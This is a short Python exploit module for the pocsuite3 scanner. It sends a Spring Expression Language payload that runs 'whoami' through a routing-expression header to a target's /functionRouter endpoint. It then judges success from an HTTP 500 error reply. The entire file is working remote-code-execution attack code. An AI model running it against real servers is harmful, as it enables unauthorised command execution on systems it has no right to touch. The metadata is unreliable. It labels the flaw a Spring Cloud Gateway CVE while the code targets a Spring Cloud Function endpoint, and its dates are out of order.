from collections import OrderedDict
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString
import requests
from urllib.parse import urljoin

class SpelRce(POCBase):
    vulID = '1'  # ssvid
    version = '1.0'
    author = ['n11dc0la']
    vulDate = '2022-3-31'
    createDate = '2022-3-17'
    updateDate = '2022-3-17'
    references = ['https://nvd.nist.gov/vuln/detail/CVE-2022-22947']
    name = 'Spring Cloud Gateway Code Injection Vulnerability (CVE-2022-22947)'
    appPowerLink = 'https://spring.io'
    appName = 'Spring Cloud Gateway'
    appVersion = '3.10,3.0.0 to 3.0.6'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = ''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        payload=f'T(java.lang.Runtime).getRuntime().exec("whoami")'
        headers = {
                'spring.cloud.function.routing-expression':payload,
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Accept-Language': 'en',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded'
                }
    
        path = urljoin(self.url, 'functionRouter')
        poc = requests.post(path,headers=headers,data='poc',timeout=15,allow_redirects=False, verify=True)
        code = poc.status_code
        text = poc.text
        rsp = '"error":"Internal Server Error"'
        if code == 500 and rsp in text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Postdata'] = path

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(SpelRce)